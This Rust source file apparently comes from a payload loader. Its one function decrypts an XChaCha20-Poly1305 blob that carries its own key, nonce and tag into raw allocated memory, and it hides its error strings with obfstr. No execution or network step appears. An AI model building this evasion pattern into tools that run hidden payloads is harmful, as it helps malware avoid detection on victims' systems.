use crate::alloc::alloc;

pub unsafe fn decrypt(decoded: &[u8]) -> crate::utils::error::RslResult<(usize, usize)> {
    #[cfg(feature = "debug")]
    crate::utils::print_message("Using XChaCha20 decryption...");

    use chacha20poly1305::aead::{AeadInPlace, KeyInit};
    use chacha20poly1305::{Key, XChaCha20Poly1305, XNonce};
    use obfstr::obfstr;

    let key_len = 32;
    let nonce_len = 24;
    let tag_len = 16;

    if decoded.len() < key_len + nonce_len + tag_len {
        return Err(crate::utils::error::RslError::DecryptionError(
            obfstr!("xchacha20 payload too short").to_string(),
        ));
    }

    let key_bytes = &decoded[0..key_len];
    let nonce_bytes = &decoded[key_len..key_len + nonce_len];
    let tag_bytes = &decoded[key_len + nonce_len..key_len + nonce_len + tag_len];
    let ciphertext = &decoded[key_len + nonce_len + tag_len..];

    let p = unsafe { alloc(ciphertext.len())? };
    std::ptr::copy_nonoverlapping(ciphertext.as_ptr(), p, ciphertext.len());

    let buf = std::slice::from_raw_parts_mut(p, ciphertext.len());

    let key = Key::from_slice(key_bytes);
    let nonce = XNonce::from_slice(nonce_bytes);
    let tag = chacha20poly1305::Tag::from_slice(tag_bytes);

    let cipher = XChaCha20Poly1305::new(key);

    cipher
        .decrypt_in_place_detached(nonce, b"", buf, tag)
        .map_err(|_| obfstr!("xchacha20 decrypt fail").to_string())?;

    Ok((p as usize, ciphertext.len()))
}
